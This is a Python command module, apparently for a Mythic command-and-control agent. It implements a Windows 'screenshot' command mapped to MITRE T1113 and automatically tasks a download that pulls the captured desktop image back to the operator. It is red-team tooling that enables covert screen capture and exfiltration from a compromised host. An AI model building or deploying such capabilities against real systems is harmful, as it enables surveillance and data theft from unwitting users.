from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import json

class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Take a screenshot of the current desktop."
    version = 1
    author = "@checkymander"
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screenshot", author="@checkymander", for_new_ui=True)
    attackmapping = ["T1113"]  # Screen Capture
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]  # Windows only for this implementation
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        response.DisplayParams = "Taking screenshot of desktop"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        """
        Process the agent response from screenshot command (Apollo's approach)
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        
        try:
            print(f"DEBUG: Screenshot response type: {type(response)}")
            print(f"DEBUG: Screenshot response content: {response}")
            
            # Handle both string and JSON responses from agent
            if isinstance(response, dict):
                if "user_output" in response:
                    # Agent returned JSON format from mythic_success!: {"status": "success", "user_output": "..."}
                    response_text = str(response["user_output"])
                    print(f"DEBUG: Extracted user_output: {response_text}")
                elif "output" in response:
                    # Agent returned JSON format: {"status": "success", "output": "..."}
                    response_text = str(response["output"])
                    print(f"DEBUG: Extracted output: {response_text}")
                else:
                    # Fallback: convert entire response to string
                    response_text = str(response)
                    print(f"DEBUG: Using entire response as string: {response_text}")
            else:
                # Agent returned plain string (our current format)
                response_text = str(response)
                print(f"DEBUG: Using plain string response: {response_text}")
            
            if response_text:
                print(f"DEBUG: Processing response_text: {response_text}")
                # Check if the response contains our special format for screenshot (Apollo's approach)
                if response_text.startswith("screenshot_captured:"):
                    print(f"DEBUG: Detected screenshot_captured format")
                    # Parse the response: format is "screenshot_captured:file_path:file_size:filename:type"
                    parts = response_text.split(":")
                    if len(parts) >= 4:
                        file_path = parts[1]
                        file_size = parts[2]
                        filename = parts[3]
                        file_type = parts[4] if len(parts) > 4 else "screenshot"
                        
                        print(f"DEBUG: Parsed screenshot info - Path: {file_path}, Size: {file_size}, Filename: {filename}")
                        
                        # Create automatic download task for the screenshot
                        print(f"DEBUG: Screenshot captured successfully - Path: {file_path}, Size: {file_size}, Filename: {filename}")
                        
                        try:
                            print(f"DEBUG: Creating automatic download task for: {file_path}")
                            
                            # Create download task with proper parameters
                            download_task = await SendMythicRPCTaskCreate(MythicRPCTaskCreateMessage(
                                TaskID=task.Task.ID,
                                CommandName="download",
                                Parameters=json.dumps({"file": file_path}),
                                CallbackID=task.Callback.ID
                            ))
                            
                            print(f"DEBUG: Download task creation - Success: {download_task.Success}")
                            if hasattr(download_task, 'Error') and download_task.Error:
                                print(f"DEBUG: Download task error: {download_task.Error}")
                            
                            if download_task.Success:
                                print(f"DEBUG: Download task created successfully")
                                
                                # Get the child task ID from the response
                                child_task_id = None
                                if hasattr(download_task, 'TaskID'):
                                    child_task_id = download_task.TaskID
                                elif hasattr(download_task, 'task') and hasattr(download_task.task, 'id'):
                                    child_task_id = download_task.task.id
                                
                                print(f"DEBUG: Child download task ID: {child_task_id}")
                                
                                if child_task_id:
                                    # Wait a bit for the download to start, then poll for the file
                                    await asyncio.sleep(2)
                                    
                                    # Poll for the downloaded file
                                    found_file_id = None
                                    for attempt in range(20):  # Increased polling attempts
                                        try:
                                            print(f"DEBUG: Polling for downloaded file (attempt {attempt + 1}/20)")
                                            
                                            # Search for files by the download task ID
                                            file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                                                TaskID=child_task_id
                                            ))
                                            
                                            print(f"DEBUG: File search - Success: {file_search.Success}, Files: {len(file_search.Files) if file_search.Success else 0}")
                                            
                                            if file_search.Success and len(file_search.Files) > 0:
                                                file_obj = file_search.Files[0]
                                                print(f"DEBUG: Found file object with attributes: {[attr for attr in dir(file_obj) if not attr.startswith('_')]}")
                                                
                                                # Try to extract the agent file ID
                                                found_file_id = (
                                                    getattr(file_obj, 'AgentFileId', None) or
                                                    getattr(file_obj, 'AgentFileID', None) or
                                                    getattr(file_obj, 'agent_file_id', None) or
                                                    getattr(file_obj, 'id', None)
                                                )
                                                
                                                print(f"DEBUG: Extracted file_id: {found_file_id}")
                                                if found_file_id:
                                                    break
                                            
                                            # Wait before next attempt
                                            await asyncio.sleep(1)
                                            
                                        except Exception as poll_error:
                                            print(f"DEBUG: Polling error: {poll_error}")
                                            await asyncio.sleep(1)
                                    
                                    if found_file_id:
                                        print(f"DEBUG: Successfully found file_id: {found_file_id}")
                                        
                                        # Create JSON response for browser script
                                        response_data = {
                                            "file_id": found_file_id,
                                            "filename": filename,
                                            "file_size": file_size,
                                            "message": f"Screenshot captured and downloaded successfully! File: {filename} ({file_size} bytes)"
                                        }
                                        
                                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                            TaskID=task.Task.ID,
                                            Response=json.dumps(response_data).encode()
                                        ))
                                        
                                        print(f"DEBUG: Created JSON response with file_id for browser script")
                                    else:
                                        print(f"DEBUG: File not found after polling, providing fallback response")
                                        # Fallback: indicate download was initiated
                                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                            TaskID=task.Task.ID,
                                            Response=f"Screenshot captured: {filename} ({file_size} bytes)\nDownload task created (ID: {child_task_id}). The image will appear in the Files tab when download completes.".encode()
                                        ))
                                else:
                                    print(f"DEBUG: No child task ID found")
                                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                        TaskID=task.Task.ID,
                                        Response=f"Screenshot captured: {filename} ({file_size} bytes)\nDownload task created but no task ID returned.".encode()
                                    ))
                            else:
                                print(f"DEBUG: Download task creation failed")
                                # Fallback: manual download instructions
                                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                    TaskID=task.Task.ID,
                                    Response=f"Screenshot captured: {filename} ({file_size} bytes)\n\nTo download manually, use: download {file_path}".encode()
                                ))
                                
                        except Exception as e:
                            print(f"DEBUG: Exception during automatic download: {str(e)}")
                            # Fallback on error
                            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                TaskID=task.Task.ID,
                                Response=f"Screenshot captured: {filename} ({file_size} bytes)\n\nTo download manually, use: download {file_path}\nError: {str(e)}".encode()
                            ))
                    else:
                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                            TaskID=task.Task.ID,
                            Response=f"Screenshot captured but failed to parse file information. Raw response: {response_text}".encode()
                        ))
                elif response_text.startswith("error:"):
                    # Handle error responses from agent
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=response_text.encode()
                    ))
                else:
                    # Regular response (might be the screenshot_captured string shown directly)
                    print(f"DEBUG: Unexpected response format: {response_text}")
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=response_text.encode()
                    ))
            else:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response="No response received from agent".encode()
                ))
                
        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=f"Error processing screenshot response: {str(e)}".encode()
            ))
            resp.Success = False
            resp.Error = str(e)
            
        return resp